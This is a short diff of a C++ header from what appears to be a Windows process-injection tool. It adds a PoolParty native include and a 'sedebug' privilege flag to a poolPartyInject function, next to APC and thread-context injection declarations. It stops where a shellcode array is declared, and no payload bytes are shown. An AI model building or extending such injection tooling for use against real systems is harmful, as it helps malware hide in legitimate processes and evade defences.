@@ -7,6 +7,7 @@
 #include "include/app/S-Wisper.h"
 #include "include/app/network.hpp"
 #include "include/app/poolparty/PoolParty.hpp"
+#include "include/app/poolparty/Native.hpp"
 
 #include <Windows.h>
 #include <winternl.h>
@@ -54,7 +55,7 @@ namespace XInject
 		}
 		bool apcInject(DWORD pid, int mode, std::string args = "");
 		bool contextInject(DWORD pid, int mode, std::string args = "");
-		bool poolPartyInject(DWORD pid, int mode, int method, std::string args);
+		bool poolPartyInject(DWORD pid, int mode, int method, std::string args, bool sedebug);
 
 
 		inline unsigned char bootshellcode[3568] = {
